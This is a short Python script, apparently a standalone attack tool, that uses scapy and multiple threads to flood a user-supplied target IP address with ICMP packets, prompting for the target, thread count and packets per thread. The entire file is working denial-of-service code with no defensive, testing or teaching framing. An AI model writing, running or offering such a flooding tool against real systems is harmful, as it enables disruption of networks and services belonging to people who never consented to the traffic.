import threading
from scapy.all import IP, ICMP, send

def icmp_spammer(thread_id, ip, packets):
    print(f"[Thread {thread_id}] Started...")
    
    pkt = IP(dst=ip) / ICMP()
    
    for _ in range(packets):
        send(pkt, verbose=False)

    print(f"[Thread {thread_id}] Finished.")

def icmp_flood(ip, threads, packets):
    print("Starting ICMP Flood...\n")
    print(f"Target: {ip}")
    print(f"Threads: {threads} | Packets per thread: {packets}\n\n")

    thread_list = []

    for t in range(threads):
        th = threading.Thread(target=icmp_spammer, args=(t, ip, packets))
        th.start()
        thread_list.append(th)

    for th in thread_list:
        th.join()

    print("\n[+] ICMP Flood Execution Completed.")

def get_int(prompt, minimum=1):
    while True:
        try:
            val = int(input(prompt))
            if val >= minimum:
                return val
            print(f"Value must be >= {minimum}")
        except ValueError:
            print("Please enter a number.")

if __name__ == "__main__":
    try:
        target_ip = input("Target IP: ").strip()
        num_threads = get_int("Threads: ", 1)
        num_packets = get_int("Packets per thread: ", 1)

        icmp_flood(target_ip, num_threads, num_packets)

    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
        exit(0)